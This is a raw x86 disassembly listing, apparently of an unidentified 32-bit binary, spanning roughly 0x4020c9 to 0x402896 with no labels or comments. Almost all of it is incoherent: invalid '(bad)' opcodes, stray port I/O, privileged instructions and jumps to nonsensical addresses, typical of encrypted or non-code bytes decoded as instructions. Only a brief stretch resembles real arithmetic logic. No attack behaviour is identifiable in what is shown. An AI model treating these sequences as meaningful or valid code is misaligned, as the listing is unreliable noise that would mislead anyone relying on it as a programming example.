  4020c9:	mov    ds:0xf31155ef,eax
  4020ce:	cs xor ebx,ebp
  4020d1:	daa    
  4020d2:	gs dec eax
  4020d4:	add    BYTE PTR [esi+edi*4+0x14],bh
  4020d8:	ror    DWORD PTR [edx],1
  4020da:	stc    
  4020db:	js     0x402079
  4020dd:	jecxz  0x402085
  4020df:	mov    dl,0x3
  4020e1:	add    eax,0x3e05ad9e
  4020e6:	imul   ebp,DWORD PTR [edx-0x4],0x232484b2
  4020ed:	in     al,dx
  4020ee:	aad    0xed
  4020f0:	add    dh,ch
  4020f2:	cmc    
  4020f3:	mov    cl,0xb1
  4020f5:	ret    0x3b3e
  4020f8:	mov    al,ds:0xa32a388f
  4020fd:	or     dh,ch
  4020ff:	jg     0x40217b
  402101:	mov    esp,0xfc201af5
  402106:	mov    ebx,0x1372087d
  40210b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40210c:	imul   ebx,DWORD PTR [ecx-0x5d],0xf0d7dafa
  402113:	mov    eax,ds:0x23ce3e5
  402118:	daa    
  402119:	sub    ebp,DWORD PTR [ecx+0x743ff080]
  40211f:	gs add ecx,ebx
  402122:	fild   QWORD PTR [edi+ebx*4+0x7f]
  402126:	and    DWORD PTR [eax+0x42d46d49],ebx
  40212c:	and    DWORD PTR ss:[ebx+0x7d],ebx
  402130:	mov    ecx,0xbbe56633
  402135:	cmc    
  402136:	(bad)  
  402137:	cmp    DWORD PTR [eax],ecx
  402139:	add    al,BYTE PTR [edx]
  40213b:	clc    
  40213c:	cmp    edi,edx
  40213e:	xchg   DWORD PTR [esi-0x1e],ebx
  402141:	pop    edi
  402142:	xchg   esi,eax
  402143:	push   edi
  402144:	jns    0x4020d4
  402146:	test   DWORD PTR [ebx-0x4],ecx
  402149:	push   edx
  40214a:	dec    esp
  40214b:	call   0x93681677
  402150:	mov    eax,ds:0x1e4524ac
  402155:	icebp  
  402156:	sbb    al,0xd4
  402158:	add    BYTE PTR [edx-0x31],0xf7
  40215c:	push   ebx
  40215d:	out    0x27,al
  40215f:	sbb    DWORD PTR [ecx-0x7cac856a],esi
  402165:	scas   eax,DWORD PTR es:[edi]
  402166:	jne    0x4021a1
  402168:	lods   eax,DWORD PTR ds:[esi]
  402169:	inc    esi
  40216a:	in     eax,0xab
  40216c:	adc    eax,0xc1ed9c91
  402171:	and    eax,0x9894efa
  402176:	jle    0x4021f5
  402178:	mov    al,0x54
  40217a:	outs   dx,BYTE PTR ds:[esi]
  40217b:	adc    eax,0x7c72c5b1
  402180:	into   
  402181:	stos   DWORD PTR es:[edi],eax
  402182:	out    dx,al
  402183:	jo     0x402120
  402185:	test   DWORD PTR [ebp-0x6895a157],esi
  40218b:	ins    DWORD PTR es:[edi],dx
  40218c:	inc    esp
  40218d:	call   0x28ec:0x202cdb0
  402194:	mov    fs,WORD PTR [edi]
  402196:	stos   DWORD PTR es:[edi],eax
  402197:	xor    DWORD PTR [eax],esp
  402199:	aaa    
  40219a:	test   eax,0xa1af9207
  40219f:	enter  0x283b,0xd5
  4021a3:	cmp    BYTE PTR [esi],dh
  4021a5:	mov    es,WORD PTR [eax]
  4021a7:	push   ds
  4021a8:	mov    esi,0x9c906f82
  4021ad:	popf   
  4021ae:	jg     0x4021d3
  4021b0:	js     0x402231
  4021b2:	cmp    BYTE PTR [eax+ebp*4+0x526f78dd],ah
  4021b9:	addr16 mov ebx,0xc0070ee9
  4021bf:	inc    ecx
  4021c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021c1:	clc    
  4021c2:	adc    eax,0x71ffbf82
  4021c7:	and    al,BYTE PTR [esi+eax*4+0x7c7c290e]
  4021ce:	and    dl,BYTE PTR [esi+0x7a9d1588]
  4021d4:	pop    ebp
  4021d5:	xchg   DWORD PTR [esi+0x0],ecx
  4021d8:	sbb    ch,BYTE PTR [eax+0x6cad5af5]
  4021de:	je     0x402192
  4021e0:	jg     0x4021e1
  4021e2:	pop    eax
  4021e3:	sub    ch,BYTE PTR [ebx-0x7a4b5136]
  4021e9:	inc    edi
  4021ea:	ffree  st(6)
  4021ec:	and    eax,0x3818dd95
  4021f1:	inc    edx
  4021f2:	sub    DWORD PTR [edx-0x1e79ba3f],ebp
  4021f8:	or     DWORD PTR [edi+eiz*4-0x4],ebx
  4021fc:	out    dx,eax
  4021fd:	mov    al,0x56
  4021ff:	lods   al,BYTE PTR ds:[esi]
  402200:	pop    ds
  402201:	inc    ecx
  402202:	(bad)  
  402204:	bound  edx,QWORD PTR [esi]
  402206:	and    BYTE PTR [edi],bh
  402208:	cld    
  402209:	jl     0x4021a2
  40220b:	data16 fistp DWORD PTR [esi+0x4e4edaa8]
  402212:	and    al,0x17
  402214:	push   0x19
  402216:	sbb    al,0x37
  402218:	cmp    al,0x17
  40221a:	shl    BYTE PTR [ecx+0xb],1
  40221d:	jbe    0x402235
  40221f:	int    0x5
  402221:	xor    BYTE PTR [ebp+0x5b],bl
  402224:	or     BYTE PTR [ebx],ch
  402226:	jo     0x4021b7
  402228:	cli    
  402229:	test   eax,0x5750fc26
  40222e:	mov    dl,0x48
  402230:	rcl    edx,0x3a
  402233:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402234:	xchg   DWORD PTR [edi-0x4c4501d6],eax
  40223a:	loope  0x40226b
  40223c:	sbb    al,0xc
  40223e:	add    DWORD PTR [ecx],ebp
  402240:	mov    ah,0xed
  402242:	xchg   edx,eax
  402243:	jecxz  0x40226f
  402245:	mov    dh,0xbd
  402247:	inc    ebp
  402248:	mov    ch,0xc4
  40224a:	lock cwde 
  40224c:	mov    ds:0x4d8b0c8f,al
  402251:	or     al,0x33
  402253:	(bad)  
  402254:	lea    eax,[eax+eax*1+0x32729a]
  40225b:	xor    ecx,esi
  40225d:	sub    ecx,eax
  40225f:	mov    ax,WORD PTR [ebp-0x4]
  402263:	movzx  eax,ax
  402266:	cmp    eax,ecx
  402268:	mov    eax,DWORD PTR [ebp+0x10]
  40226b:	movzx  ecx,WORD PTR [ebp-0x4]
  40226f:	jg     0x40258a
  402275:	xor    eax,esi
  402277:	sub    ecx,eax
  402279:	sub    ecx,edi
  40227b:	mov    WORD PTR [ebp-0x4],cx
  40227f:	jmp    0x402597
  402284:	jmp    0x40258a
  402289:	pop    edi
  40228a:	pop    eax
  40228b:	dec    edx
  40228c:	pop    es
  40228d:	push   ebp
  40228e:	xor    DWORD PTR [ebp+0x60],edi
  402291:	push   es
  402292:	sti    
  402293:	rcr    DWORD PTR [esi+0x5d80c257],1
  402299:	add    DWORD PTR [edx],0x7c
  40229c:	jl     0x402305
  40229e:	jle    0x40231c
  4022a0:	jl     0x402223
  4022a2:	sub    al,0xf3
  4022a4:	add    BYTE PTR [edx],al
  4022a6:	or     al,0xa1
  4022a8:	xlat   BYTE PTR ds:[ebx]
  4022a9:	in     eax,0xc
  4022ab:	dec    eax
  4022ac:	stc    
  4022ad:	(bad)  
  4022af:	sbb    DWORD PTR [ebp+0x3fd9cf20],edi
  4022b5:	in     al,dx
  4022b6:	push   ecx
  4022b7:	in     al,0xf1
  4022b9:	pusha  
  4022ba:	fwait
  4022bb:	push   ss
  4022bc:	jge    0x4022c9
  4022be:	mov    ah,0xcd
  4022c0:	fimul  WORD PTR [edi-0x2799c293]
  4022c6:	in     eax,dx
  4022c7:	out    dx,eax
  4022c8:	dec    ebx
  4022c9:	int    0xc3
  4022cb:	sbb    ebp,esp
  4022cd:	push   eax
  4022ce:	int    0xcd
  4022d0:	ins    DWORD PTR es:[edi],dx
  4022d1:	loop   0x4022f0
  4022d3:	xchg   edi,eax
  4022d4:	sub    DWORD PTR [edi],0x53a6e13c
  4022da:	mov    ah,0xea
  4022dc:	jmp    ebx
  4022de:	mov    ecx,DWORD PTR [ecx]
  4022e0:	jg     0x40227a
  4022e2:	(bad)  
  4022e3:	dec    edi
  4022e4:	xor    DWORD PTR [esi],edi
  4022e6:	mov    ah,0x1c
  4022e8:	add    DWORD PTR [esi],ebp
  4022ea:	popf   
  4022eb:	fdiv   DWORD PTR [edi]
  4022ed:	shr    BYTE PTR [ecx-0x330cbacb],cl
  4022f3:	mov    bh,0xe3
  4022f5:	iret   
  4022f6:	loop   0x40232a
  4022f8:	(bad)  
  4022f9:	stos   BYTE PTR es:[edi],al
  4022fa:	or     ebx,DWORD PTR [ebp+0x6116e9d6]
  402300:	imul   ebp,DWORD PTR [edi-0x30],0xd3668cc3
  402307:	add    eax,0xf293e9d4
  40230c:	fimul  DWORD PTR ds:0x935e7cc9
  402312:	dec    ebp
  402313:	push   ebp
  402314:	xchg   ecx,eax
  402315:	add    ebx,ebx
  402317:	sbb    ah,dh
  402319:	clc    
  40231a:	and    al,0xfa
  40231c:	pop    eax
  40231d:	out    0xdc,al
  40231f:	pop    eax
  402320:	lods   eax,DWORD PTR ds:[esi]
  402321:	or     al,0x5d
  402323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402324:	inc    ecx
  402325:	aam    0xa0
  402327:	in     al,dx
  402328:	cmp    esp,DWORD PTR [esi]
  40232a:	lock sub al,0xad
  40232d:	sub    DWORD PTR [ebp+0x70b3107a],edi
  402333:	pop    ebp
  402334:	pop    esp
  402335:	cmp    edx,edx
  402337:	xor    BYTE PTR [ecx+edx*1+0x19cc791b],dh
  40233e:	jbe    0x402300
  402340:	scas   eax,DWORD PTR es:[edi]
  402341:	inc    esp
  402342:	(bad)  
  402343:	pop    eax
  402344:	xchg   edx,eax
  402345:	in     eax,0xe7
  402347:	loope  0x402353
  402349:	jl     0x4023a4
  40234b:	addr16 cmp al,0xe5
  40234e:	inc    edx
  40234f:	daa    
  402350:	sbb    eax,esi
  402352:	push   es
  402353:	sbb    cl,cl
  402355:	test   al,0x3a
  402357:	fdivr  QWORD PTR [ebp-0x49e74e24]
  40235d:	scas   al,BYTE PTR es:[di]
  40235f:	out    0xa3,al
  402361:	cwde   
  402362:	iret   
  402363:	dec    edi
  402364:	mov    cl,0xe9
  402366:	xchg   edx,eax
  402367:	int3   
  402368:	ret    0xbe6e
  40236b:	sub    DWORD PTR [eax-0x43],ebp
  40236e:	fdiv   QWORD PTR [ecx+ecx*2+0x70]
  402372:	pusha  
  402373:	sub    eax,0x383d2915
  402378:	(bad)  
  402379:	dec    ecx
  40237a:	dec    edi
  40237b:	adc    ah,BYTE PTR [bx+0x34b9]
  402380:	inc    edx
  402381:	retf   
  402382:	or     DWORD PTR ds:0x65073996,0x2e
  402389:	aas    
  40238a:	mov    ah,0xfa
  40238c:	ins    BYTE PTR es:[edi],dx
  40238d:	sub    al,0xfc
  40238f:	or     eax,0xfc92ed8f
  402394:	inc    edi
  402395:	mov    bh,0xd2
  402397:	cmp    ah,BYTE PTR [edi-0x6c22079b]
  40239d:	pop    es
  40239e:	loopne 0x402320
  4023a0:	adc    al,0x62
  4023a2:	ja     0x4023e8
  4023a4:	xchg   esp,eax
  4023a5:	push   esp
  4023a6:	fnstcw WORD PTR [edx]
  4023a8:	aas    
  4023a9:	in     al,0x23
  4023ab:	lods   eax,DWORD PTR ds:[esi]
  4023ac:	retf   
  4023ad:	cmp    cl,BYTE PTR [edi-0x7e]
  4023b0:	enter  0x2347,0x59
  4023b4:	dec    eax
  4023b5:	cli    
  4023b6:	xor    eax,0x34bd685a
  4023bb:	mov    esp,0x2da520e2
  4023c0:	and    ecx,esp
  4023c2:	test   al,0xdf
  4023c4:	hlt    
  4023c5:	mov    dh,0xe1
  4023c7:	cwde   
  4023c8:	xlat   BYTE PTR ds:[ebx]
  4023c9:	xlat   BYTE PTR ds:[ebx]
  4023ca:	test   BYTE PTR [edx+0xa],ah
  4023cd:	mov    esi,0x378a0cbb
  4023d2:	dec    eax
  4023d3:	pushf  
  4023d4:	outs   dx,BYTE PTR ds:[esi]
  4023d5:	jmp    0x1196a2d1
  4023da:	int    0x67
  4023dc:	dec    ebx
  4023dd:	lods   al,BYTE PTR cs:[esi]
  4023df:	(bad)  
  4023e0:	in     al,dx
  4023e1:	sub    BYTE PTR [ebx+eiz*2-0x67],dl
  4023e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023e6:	dec    eax
  4023e7:	das    
  4023e8:	mov    BYTE PTR [ebx+0x445a50a2],ah
  4023ee:	cld    
  4023ef:	pop    edi
  4023f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023f1:	ja     0x402389
  4023f3:	add    BYTE PTR es:0x639bda2e,dl
  4023fa:	jno    0x40246f
  4023fc:	retf   0x753f
  4023ff:	cmp    BYTE PTR [eax],ah
  402401:	and    cl,BYTE PTR [edx-0x2c7f078a]
  402407:	mov    edi,0xe79a026d
  40240c:	xchg   BYTE PTR [edx],al
  40240e:	mov    cl,0x5a
  402410:	retf   
  402411:	jg     0x402397
  402413:	aas    
  402414:	out    0x85,al
  402416:	inc    ebp
  402417:	adc    DWORD PTR [esi+ecx*1],ecx
  40241a:	test   eax,0x74feb98
  40241f:	adc    eax,0xe2d6abea
  402424:	inc    esp
  402425:	in     al,0xb7
  402427:	mov    BYTE PTR ds:0xb9d1a59,cl
  40242d:	mov    ds:0x7530f69b,al
  402432:	imul   ebx,DWORD PTR [eax],0x15240fd8
  402438:	add    ah,BYTE PTR [ebp+0x1e]
  40243b:	ret    0xd3d5
  40243e:	arpl   WORD PTR [ebp-0x42],bp
  402441:	(bad)  
  402442:	push   esi
  402443:	mov    ah,0x8
  402445:	xlat   BYTE PTR ds:[ebx]
  402446:	pop    edx
  402447:	xor    BYTE PTR [esi],dh
  402449:	fsub   QWORD PTR [esi]
  40244b:	or     DWORD PTR [esi-0x69],esi
  40244e:	pusha  
  40244f:	or     dh,BYTE PTR [eax+0x57]
  402452:	dec    ebx
  402453:	mov    bl,0x72
  402455:	ds jle 0x40249b
  402458:	jns    0x4024d4
  40245a:	bound  eax,QWORD PTR [edi]
  40245c:	nop
  40245d:	aaa    
  40245e:	fnstsw WORD PTR [ecx-0x49]
  402461:	cli    
  402462:	icebp  
  402463:	xchg   DWORD PTR [edi+ecx*4],esp
  402466:	inc    edx
  402467:	outs   dx,BYTE PTR ds:[esi]
  402468:	mov    ebx,0xeaa9db94
  40246d:	test   eax,0x1ca9c7e4
  402472:	fwait
  402473:	xchg   BYTE PTR [bx-0x55],bl
  402477:	mov    edi,0x79aee199
  40247c:	cs push ss
  40247e:	pop    ss
  40247f:	xor    eax,0x229a7ec3
  402484:	mov    WORD PTR [esi+eax*1-0x3b],ds
  402488:	inc    ecx
  402489:	pop    edx
  40248a:	cmp    eax,0xfe786dc1
  40248f:	sbb    dh,BYTE PTR [edi+eax*1]
  402492:	sbb    al,0x86
  402494:	sub    bl,BYTE PTR [ebp+0x3037dd4c]
  40249a:	fs mov ah,0xe0
  40249d:	xchg   esp,eax
  40249e:	fisub  DWORD PTR [edi+esi*4]
  4024a1:	and    edi,ebx
  4024a3:	pop    ss
  4024a4:	and    bh,BYTE PTR [edi+0x62f75465]
  4024aa:	add    al,0x86
  4024ac:	add    esp,esp
  4024ae:	sub    al,0xe3
  4024b0:	push   esp
  4024b1:	xchg   ebp,eax
  4024b2:	push   edi
  4024b3:	bound  esp,QWORD PTR [edi]
  4024b5:	jnp    0x40252a
  4024b7:	xor    ah,BYTE PTR [ebx-0x63132879]
  4024bd:	out    0x6f,al
  4024bf:	jno    0x4024fc
  4024c1:	xor    cl,cl
  4024c3:	enter  0x9789,0x9d
  4024c7:	adc    al,BYTE PTR [edi]
  4024c9:	or     ebx,DWORD PTR ds:0x2539d60f
  4024cf:	daa    
  4024d0:	(bad)  
  4024d1:	mov    esi,0xe6d87041
  4024d6:	add    al,0x92
  4024d8:	push   es
  4024d9:	mov    ebp,0xcba3d4ee
  4024de:	aaa    
  4024df:	inc    eax
  4024e0:	sti    
  4024e1:	(bad)  
  4024e2:	or     eax,0xf5cd9850
  4024e7:	add    al,0x81
  4024e9:	mov    dl,0x7b
  4024eb:	mov    ch,0x4
  4024ed:	ins    DWORD PTR es:[edi],dx
  4024ee:	mov    ds:0xac4d2aaf,al
  4024f3:	mov    ecx,DWORD PTR fs:[esi-0x6e]
  4024f7:	retf   0xe797
  4024fa:	std    
  4024fb:	mov    esi,0x7804c728
  402500:	cmc    
  402501:	push   eax
  402502:	add    BYTE PTR [ebx],dl
  402504:	or     al,0xda
  402506:	push   ecx
  402507:	sub    ecx,DWORD PTR [eax]
  402509:	retf   
  40250a:	mov    edi,0xe2c9de28
  40250f:	sbb    al,0x88
  402511:	sub    DWORD PTR [edx-0x1d7a2d7b],0x78
  402518:	push   edx
  402519:	pop    ds
  40251a:	retf   0xd39c
  40251d:	scas   al,BYTE PTR es:[edi]
  40251e:	cmp    ebp,DWORD PTR [ecx-0x2211fa4b]
  402524:	rcl    DWORD PTR [esi],0x74
  402527:	es mov bh,0x4c
  40252a:	es pop edx
  40252c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40252d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40252e:	int3   
  40252f:	ins    BYTE PTR es:[edi],dx
  402530:	je     0x4024c8
  402532:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402533:	aas    
  402534:	test   al,0x34
  402536:	mov    bl,0x64
  402538:	xor    BYTE PTR [eax+ebx*8+0x13],dl
  40253c:	inc    esp
  40253d:	pop    esi
  40253e:	jg     0x402534
  402540:	es cmc 
  402542:	nop
  402543:	xchg   esp,eax
  402544:	add    al,0xa4
  402546:	aas    
  402547:	jmp    0xdc0769f6
  40254c:	fmul   QWORD PTR [edx+0x5957d0d9]
  402552:	dec    ebx
  402553:	stos   BYTE PTR es:[edi],al
  402554:	dec    ecx
  402555:	(bad)  
  402556:	outs   dx,DWORD PTR ds:[esi]
  402557:	mov    ch,BYTE PTR [ebp+0x2e]
  40255a:	push   cs
  40255b:	sbb    dl,BYTE PTR [ebx]
  40255d:	pop    ebp
  40255e:	add    eax,0x5f5bd8a2
  402563:	xor    al,0x33
  402565:	ins    DWORD PTR es:[edi],dx
  402566:	or     eax,0x252ce91d
  40256b:	adc    BYTE PTR ds:[ebx+eiz*4+0x9],cl
  402570:	lods   al,BYTE PTR ds:[esi]
  402571:	inc    edx
  402572:	or     DWORD PTR [ebp+0x7d91d09d],0x74c0d577
  40257c:	push   0xffffffe9
  40257e:	mov    BYTE PTR [edi+0x27],0x46
  402582:	les    esp,FWORD PTR [edx+eax*8]
  402585:	pop    es
  402586:	sub    eax,DWORD PTR [edi-0x39cc6e04]
  40258c:	lea    eax,[eax+ecx*1+0x32729a]
  402593:	mov    WORD PTR [ebp-0x4],ax
  402597:	mov    eax,DWORD PTR [ebp-0xc]
  40259a:	cmp    eax,ebx
  40259c:	jmp    0x4028a2
  4025a1:	mov    cs,WORD PTR [edx-0x1e6f1870]
  4025a7:	jne    0x402626
  4025a9:	adc    BYTE PTR [eax-0x26],0xee
  4025ad:	dec    edi
  4025ae:	add    BYTE PTR [ebx],bh
  4025b0:	cmp    eax,0x7c7c0fea
  4025b5:	addr16 jle 0x402634
  4025b8:	jl     0x402540
  4025ba:	(bad)  
  4025bb:	mov    edx,0x5740db27
  4025c0:	adc    eax,0xf9a28572
  4025c5:	retf   0x4ed4
  4025c8:	or     edx,edi
  4025ca:	mov    edi,0x5bf454c5
  4025cf:	jmp    0x2c8ec7a9
  4025d4:	jmp    0x2f7017df
  4025d9:	imul   esi,ebx,0xeab58beb
  4025df:	outs   dx,BYTE PTR ds:[esi]
  4025e0:	push   ss
  4025e1:	aam    0x83
  4025e3:	mov    cl,0xea
  4025e5:	retf   0x75c9
  4025e8:	clc    
  4025e9:	lahf   
  4025ea:	sar    BYTE PTR [esp+ebx*1],1
  4025ed:	test   eax,0xaf73ebac
  4025f2:	mov    al,ds:0xf94e90ce
  4025f7:	out    0xd1,eax
  4025f9:	arpl   WORD PTR [eax],di
  4025fb:	mov    WORD PTR [ecx+0x61],?
  4025fe:	xor    ebx,DWORD PTR [edx+0x63a294c7]
  402604:	and    ch,BYTE PTR [edi+0x38fa9d75]
  40260a:	(bad)  
  40260b:	jb     0x402629
  40260d:	jl     0x402656
  40260f:	inc    eax
  402610:	pop    DWORD PTR [ebx+0x72]
  402613:	imul   eax,DWORD PTR [eax+0x17],0xe0474ba
  40261a:	mov    bl,0xc4
  40261c:	stc    
  40261d:	adc    DWORD PTR [ebp+0xc857b3b],esp
  402623:	xlat   BYTE PTR ds:[ebx]
  402624:	ins    DWORD PTR es:[edi],dx
  402625:	loop   0x402676
  402627:	or     eax,0x5a1265e9
  40262c:	adc    esp,DWORD PTR [edi+ebx*1-0x22a6022e]
  402633:	and    BYTE PTR ds:0x9fbb23db,bl
  402639:	xor    edi,edx
  40263b:	and    al,0xb0
  40263d:	inc    ebp
  40263e:	mov    ecx,0xd990ffdd
  402643:	mov    al,ds:0xd483877c
  402648:	and    BYTE PTR [edx+0x67815f49],ah
  40264e:	pop    edx
  40264f:	add    edx,ecx
  402651:	sub    ebp,DWORD PTR [ebp+0x75]
  402654:	arpl   di,sp
  402656:	(bad)  [ecx]
  402658:	sbb    edi,ecx
  40265a:	xchg   edi,eax
  40265b:	dec    edx
  40265c:	stos   DWORD PTR es:[edi],eax
  40265d:	mov    ah,0xba
  40265f:	xor    eax,0x45b2a6b5
  402664:	xchg   ebx,eax
  402665:	or     eax,0x6fa7e977
  40266a:	ins    DWORD PTR es:[edi],dx
  40266b:	xor    esp,DWORD PTR [edx+0x69]
  40266e:	mov    edi,0x929e245b
  402673:	xlat   BYTE PTR ds:[ebx]
  402674:	hlt    
  402675:	ret    
  402676:	call   0x155b:0xaf72dd2
  40267d:	xlat   BYTE PTR ds:[ebx]
  40267e:	xchg   ecx,eax
  40267f:	mov    ebx,0xb7ce16c3
  402684:	pop    es
  402685:	jns    0x402683
  402687:	add    dh,0x7
  40268a:	sbb    al,bl
  40268c:	xlat   BYTE PTR ds:[ebx]
  40268d:	jp     0x40269d
  40268f:	bound  eax,QWORD PTR [edi-0x29]
  402692:	dec    ecx
  402693:	pop    esp
  402694:	dec    edx
  402695:	pop    esp
  402696:	fild   WORD PTR [edx+edx*4-0x18]
  40269a:	repnz sar ebx,1
  40269d:	xchg   esi,eax
  40269e:	repnz inc ebp
  4026a0:	and    BYTE PTR [ecx*4-0x7363da2a],bh
  4026a7:	mov    ah,0x1e
  4026a9:	mov    fs,WORD PTR [ecx-0x2e8d126c]
  4026af:	data16 loopne 0x40271c
  4026b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026b3:	in     al,0x99
  4026b5:	jnp    0x402733
  4026b7:	faddp  st(0),st
  4026b9:	lahf   
  4026ba:	sbb    DWORD PTR [eax-0x68d0f863],eax
  4026c0:	mov    al,ds:0xb8947a47
  4026c5:	addr16 pop ds
  4026c7:	std    
  4026c8:	ja     0x4026e6
  4026ca:	scas   eax,DWORD PTR es:[edi]
  4026cb:	push   cs
  4026cc:	test   ah,dh
  4026ce:	in     al,0xec
  4026d0:	adc    al,0x8a
  4026d2:	outs   dx,BYTE PTR ds:[esi]
  4026d3:	pop    eax
  4026d4:	js     0x40274c
  4026d6:	ror    BYTE PTR [edx+0x3a],cl
  4026d9:	scas   al,BYTE PTR es:[edi]
  4026da:	inc    esp
  4026db:	push   edx
  4026dc:	or     bl,BYTE PTR [edx+0x12]
  4026df:	push   ebp
  4026e0:	mov    eax,0xeb503b51
  4026e5:	popf   
  4026e6:	ret    
  4026e7:	mov    bl,BYTE PTR [edx-0x7e326304]
  4026ed:	jmp    0xa59c:0xbeaece00
  4026f4:	js     0x4026b7
  4026f6:	adc    eax,0xc80bc75f
  4026fb:	stos   BYTE PTR es:[edi],al
  4026fc:	dec    eax
  4026fd:	add    al,0x46
  4026ff:	fstp   st(2)
  402701:	and    edi,ecx
  402703:	ret    0xb277
  402706:	sub    DWORD PTR ds:0x248a03f4,eax
  40270c:	cwde   
  40270d:	cmp    eax,0xd61ef306
  402712:	jmp    0x402748
  402714:	push   ebp
  402715:	retf   0x3697
  402718:	add    dh,BYTE PTR [ecx-0x517fcb8d]
  40271e:	inc    edi
  40271f:	push   ecx
  402720:	fs mov al,0x24
  402723:	pop    eax
  402724:	(bad)  
  402725:	je     0x402774
  402727:	loopne 0x4026f9
  402729:	fild   DWORD PTR [ebp-0x11fc845f]
  40272f:	mov    dl,0x8
  402731:	jg     0x402790
  402733:	in     al,dx
  402734:	push   ss
  402735:	mov    dl,0x3e
  402737:	xchg   DWORD PTR [ecx],edx
  402739:	dec    ebx
  40273a:	mov    ch,0x6c
  40273c:	jg     0x402729
  40273e:	in     al,dx
  40273f:	pop    eax
  402740:	fstp   QWORD PTR [eax-0x29a850f6]
  402746:	mov    dh,0x9f
  402748:	(bad)  
  40274a:	aaa    
  40274b:	and    eax,ebp
  40274d:	int    0x72
  40274f:	xlat   BYTE PTR ds:[ebx]
  402750:	or     bh,BYTE PTR [ebp+0x67]
  402753:	push   ecx
  402754:	inc    ecx
  402755:	sub    al,0x20
  402757:	stos   BYTE PTR es:[edi],al
  402758:	sbb    BYTE PTR [ebp+0x5a],al
  40275b:	xor    eax,0xb9bdcca5
  402760:	aam    0xb6
  402762:	gs inc ebp
  402764:	inc    edx
  402765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402766:	gs xchg ecx,eax
  402768:	and    al,0x4a
  40276a:	sar    DWORD PTR ds:[esi+0x235c04d1],cl
  402771:	mov    ecx,0x9e4903a
  402776:	pop    es
  402777:	or     BYTE PTR [eax+0x31],bl
  40277a:	jbe    0x40278e
  40277c:	retf   0x2f0b
  40277f:	int    0xdd
  402781:	dec    esi
  402782:	loope  0x402791
  402784:	add    al,0xa6
  402786:	aad    0x43
  402788:	or     bh,BYTE PTR [ebx+ecx*8]
  40278b:	std    
  40278c:	inc    esi
  40278d:	mov    eax,ds:0x45126282
  402792:	push   esp
  402793:	dec    ebp
  402794:	mov    al,ds:0x1d9b91a0
  402799:	hlt    
  40279a:	dec    edx
  40279b:	cmp    eax,0xe4700b1
  4027a0:	jmp    0xf4a96562
  4027a5:	dec    ebp
  4027a6:	xor    DWORD PTR [edx+0x1f],edi
  4027a9:	mov    dl,0x1e
  4027ab:	lea    ebx,[eax+0x3bec9846]
  4027b1:	add    BYTE PTR [ecx+ecx*2],dh
  4027b4:	fidiv  DWORD PTR [ebx-0x20d2f04c]
  4027ba:	xchg   esp,eax
  4027bb:	scas   al,BYTE PTR es:[edi]
  4027bc:	aam    0xd3
  4027be:	repnz mov edx,0x60fe30bc
  4027c4:	jg     0x402748
  4027c6:	sub    eax,0xc9b3425a
  4027cb:	ja     0x4027c8
  4027cd:	fidivr WORD PTR [esi]
  4027cf:	in     al,dx
  4027d0:	dec    ecx
  4027d1:	mov    dl,0xde
  4027d3:	adc    BYTE PTR [ecx],0xd3
  4027d6:	lahf   
  4027d7:	push   0xffffff90
  4027d9:	adc    DWORD PTR [ebx],esp
  4027db:	cli    
  4027dc:	xor    eax,0xdab26ee1
  4027e1:	ja     0x40276f
  4027e3:	inc    DWORD PTR [edi+0x6c]
  4027e6:	stos   BYTE PTR es:[di],al
  4027e8:	xor    al,0xe5
  4027ea:	push   esp
  4027eb:	push   ecx
  4027ec:	jbe    0x4027ae
  4027ee:	scas   al,BYTE PTR es:[edi]
  4027ef:	pop    esp
  4027f0:	cmp    DWORD PTR [edx+0x76991225],eax
  4027f6:	stos   BYTE PTR es:[edi],al
  4027f7:	sub    BYTE PTR [edx+0x3bd7c40d],al
  4027fd:	and    edi,DWORD PTR [edi+0x71]
  402800:	or     al,BYTE PTR [ebp-0x541ab166]
  402806:	icebp  
  402807:	imul   edx,DWORD PTR [esi],0xcea48503
  40280d:	loope  0x402884
  40280f:	push   edi
  402810:	inc    esp
  402811:	add    DWORD PTR [eax-0x50],edi
  402814:	sub    al,0xa
  402816:	jns    0x4027c5
  402818:	ds jl  0x4027af
  40281b:	sbb    al,0x17
  40281d:	scas   eax,DWORD PTR es:[edi]
  40281e:	popf   
  40281f:	adc    al,0x31
  402821:	or     eax,0x487ddcc1
  402826:	and    BYTE PTR [ebx],ch
  402828:	jae    0x4027c0
  40282a:	ret    
  40282b:	mov    bh,0xa5
  40282d:	jns    0x402821
  40282f:	gs and al,0xd3
  402832:	fisttp WORD PTR [ebx+0xc]
  402835:	popa   
  402836:	leave  
  402837:	imul   DWORD PTR ds:0xe200c4ce
  40283d:	inc    ebx
  40283e:	mov    bh,0x15
  402840:	mov    eax,ds:0x569b8dd3
  402845:	les    edi,FWORD PTR [edx+0x1e]
  402848:	rcr    BYTE PTR [eax-0x46],cl
  40284b:	js     0x402845
  40284d:	cmp    DWORD PTR [edi],ecx
  40284f:	fadd   DWORD PTR [edx+0x1b219208]
  402855:	scas   eax,DWORD PTR es:[edi]
  402856:	mov    ds:0x4113b7bb,eax
  40285b:	das    
  40285c:	or     esp,DWORD PTR [edx-0x7512b692]
  402862:	jb     0x402827
  402864:	or     DWORD PTR [esi],esi
  402866:	mov    bl,0x28
  402868:	imul   ch
  40286a:	fnstenv [eax]
  40286c:	pushf  
  40286d:	mov    ebx,0xfd0b6945
  402872:	inc    ecx
  402873:	ret    
  402874:	dec    ecx
  402875:	outs   dx,DWORD PTR ds:[esi]
  402876:	push   edi
  402877:	inc    sp
  402879:	inc    eax
  40287a:	dec    eax
  40287b:	stc    
  40287c:	dec    ecx
  40287d:	fidivr DWORD PTR [eax]
  40287f:	xchg   edx,eax
  402880:	or     BYTE PTR [eax+ebx*1],bh
  402883:	mov    ebx,0x293a6135
  402888:	and    cl,cl
  40288a:	pop    ebx
  40288b:	mov    si,0xdc87
  40288f:	es mov ebx,0xad7956b9
  402895:	pop    eax
  402896:	xor    dh,BYTE PTR [ebp-0x6023a21e]
